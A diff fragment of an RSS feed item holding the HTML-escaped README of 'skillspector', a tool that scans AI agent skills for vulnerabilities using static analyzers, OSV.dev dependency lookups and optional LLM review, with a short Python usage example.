+&lt;h3 id=&#34;stage-1-static-analysis&#34;&gt;Stage 1: Static Analysis
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Fast regex-based pattern matching across 11 static analyzers&lt;/li&gt;
+&lt;li&gt;AST-based behavioral analysis detecting dangerous calls (exec, eval, subprocess, etc.)&lt;/li&gt;
+&lt;li&gt;Live vulnerability lookups via OSV.dev for known CVEs in dependencies&lt;/li&gt;
+&lt;li&gt;Scans all files in the skill&lt;/li&gt;
+&lt;li&gt;High recall (catches most issues)&lt;/li&gt;
+&lt;li&gt;Moderate precision (some false positives)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;stage-2-llm-semantic-analysis-optional&#34;&gt;Stage 2: LLM Semantic Analysis (Optional)
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Evaluates context and intent&lt;/li&gt;
+&lt;li&gt;Filters false positives&lt;/li&gt;
+&lt;li&gt;Provides human-readable explanations&lt;/li&gt;
+&lt;li&gt;Improves precision to ~87%&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The LLM prompt includes anti-jailbreak protections to prevent malicious skills from manipulating the analysis.&lt;/p&gt;
+&lt;h2 id=&#34;live-vulnerability-lookups-sc4&#34;&gt;Live Vulnerability Lookups (SC4)
+&lt;/h2&gt;&lt;p&gt;SC4 uses the &lt;a class=&#34;link&#34; href=&#34;https://osv.dev&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;OSV.dev&lt;/a&gt; API to check dependencies against the full Open Source Vulnerabilities database — covering tens of thousands of advisories across PyPI and npm.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;No API key required&lt;/strong&gt; — OSV.dev is free and unauthenticated.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Batch queries&lt;/strong&gt; — all dependencies are checked in a single HTTP call.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Automatic fallback&lt;/strong&gt; — if OSV.dev is unreachable (air-gapped/offline), a small built-in fallback list is used.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Caching&lt;/strong&gt; — results are cached in-memory for 1 hour to avoid redundant API calls during a session.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The tool requires outbound HTTPS access to &lt;code&gt;api.osv.dev&lt;/code&gt; for live vulnerability data. When that is not available, findings are limited to the static fallback list.&lt;/p&gt;
+&lt;h2 id=&#34;limitations&#34;&gt;Limitations
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Non-English content&lt;/strong&gt;: May miss patterns in other languages&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Image-based attacks&lt;/strong&gt;: Cannot analyze text in images&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Encrypted/binary code&lt;/strong&gt;: Cannot analyze compiled or encrypted content&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Runtime behavior&lt;/strong&gt;: Static analysis only, no dynamic execution&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Offline SC4&lt;/strong&gt;: Without network access to &lt;code&gt;api.osv.dev&lt;/code&gt;, SC4 uses a small static fallback list&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;research-background&#34;&gt;Research Background
+&lt;/h2&gt;&lt;p&gt;Based on research from &amp;ldquo;Agent Skills in the Wild: An Empirical Study of Security Vulnerabilities at Scale&amp;rdquo; (Liu et al., 2026):&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Dataset&lt;/strong&gt;: 42,447 skills from major marketplaces&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Vulnerable&lt;/strong&gt;: 26.1% contain at least one vulnerability&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;High-severity&lt;/strong&gt;: 5.2% show likely malicious intent&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Key finding&lt;/strong&gt;: Skills with executable scripts are 2.12x more likely to be vulnerable&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;python-api-integration&#34;&gt;Python API Integration
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;skillspector&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;graph&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Invoke the LangGraph workflow&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;graph&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;input_path&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/path/to/skill&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;output_format&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;json&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;# terminal, json, markdown, or sarif&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_llm&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;           &lt;span class=&#34;c1&#34;&gt;# False for static-only analysis&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Access results&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Risk Score: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;risk_score&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/100&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Severity: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;risk_severity&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Recommendation: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;risk_recommendation&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;finding&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;filtered_findings&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;finding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;severity&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;] &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;finding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;rule_id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;finding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;license&#34;&gt;License
+&lt;/h2&gt;&lt;p&gt;Apache License 2.0 - see &lt;a class=&#34;link&#34; href=&#34;LICENSE&#34; &gt;LICENSE&lt;/a&gt; for details.&lt;/p&gt;
+&lt;h2 id=&#34;contributing&#34;&gt;Contributing
+&lt;/h2&gt;&lt;p&gt;Contributions are welcome! Please read our contributing guidelines and submit pull requests.&lt;/p&gt;
+&lt;h2 id=&#34;support&#34;&gt;Support
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Issues&lt;/strong&gt;: &lt;a class=&#34;link&#34; href=&#34;https://github.com/NVIDIA/skillspector/issues&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;GitHub Issues&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
